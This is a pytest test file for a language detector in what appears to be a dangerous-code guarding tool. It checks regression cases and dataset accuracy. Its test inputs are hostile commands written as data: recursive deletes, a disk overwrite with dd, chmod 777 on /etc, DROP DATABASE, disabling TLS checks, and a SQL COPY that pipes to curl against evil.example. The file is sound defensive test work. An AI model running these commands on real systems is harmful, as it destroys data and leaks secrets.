"""Language-detection tests, including regressions for the original defects.

Original defects:
* ``rm -rf /var/www/*`` was labelled ``javascript`` because ``/var/`` matched
  ``\\bvar\\b`` (the JS check ran before the shell check).
* ``fs.rmSync('/', {recursive: true})`` and ``process.env.X = '0';`` parse as
  valid Python, so they were labelled ``python`` and the JS rules never ran.
* The word "function" inside a Python docstring voted for JavaScript.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from textcodeguard.detect.language import detect_language

REPO_ROOT = Path(__file__).resolve().parent.parent


@pytest.mark.parametrize(
    ("code", "expected"),
    [
        ('rm -rf /var/www/*', "bash"),
        ('sudo rm -rf "$HOME"', "bash"),
        ("chmod -R 777 /etc", "bash"),
        ('find / -type f -name "*.conf" -delete', "bash"),
        ("dd if=/dev/zero of=/dev/sda bs=1M", "bash"),
        ("git diff --check", "bash"),
        ("ls -la ~/.aws/", "bash"),
        ('#!/usr/bin/env bash\nset -euo pipefail\necho hi', "bash"),
        ("#!/usr/bin/env python3\nprint(1)", "python"),
        ("fs.rmSync('/', { recursive: true, force: true });", "javascript"),
        ("process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';", "javascript"),
        ("const x = require('fs');", "javascript"),
        ("fetch('https://a.b', { method: 'POST' });", "javascript"),
        ("DROP DATABASE production;", "sql"),
        ("UPDATE accounts SET balance = 0;", "sql"),
        ("GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';", "sql"),
        ("CREATE INDEX idx_orders_customer ON orders(customer_id);", "sql"),
        ("COPY secrets TO PROGRAM 'curl http://evil.example/x'", "sql"),
        ("import os\nos.system('ls')", "python"),
        ("def f(x):\n    return x + 1", "python"),
        (
            'import logging\nlogger = logging.getLogger(__name__)\n'
            'POLICY = """This function validates that no credentials are hardcoded."""\n'
            'def a():\n    return 1',
            "python",
        ),
    ],
)
def test_detect_language(code, expected):
    assert detect_language(code) == expected


def test_empty_is_unknown():
    assert detect_language("") == "unknown"
    assert detect_language("   \n ") == "unknown"


def test_accuracy_against_labelled_tracked_datasets():
    """Guard against regressions using the language labels shipped in the repo."""
    files = ["dev.jsonl", "unseen.jsonl", "hard_eval.jsonl", "hard.jsonl"]
    total = correct = 0
    for name in files:
        path = REPO_ROOT / name
        if not path.exists():
            continue
        for line in path.read_text(encoding="utf-8-sig").splitlines():
            if not line.strip():
                continue
            rec = json.loads(line)
            want = rec.get("language")
            if not want:
                continue
            total += 1
            correct += detect_language(rec["code"]) == want
    if total == 0:
        pytest.skip("no labelled language data available")
    assert correct / total >= 0.9, f"language accuracy dropped to {correct}/{total}"
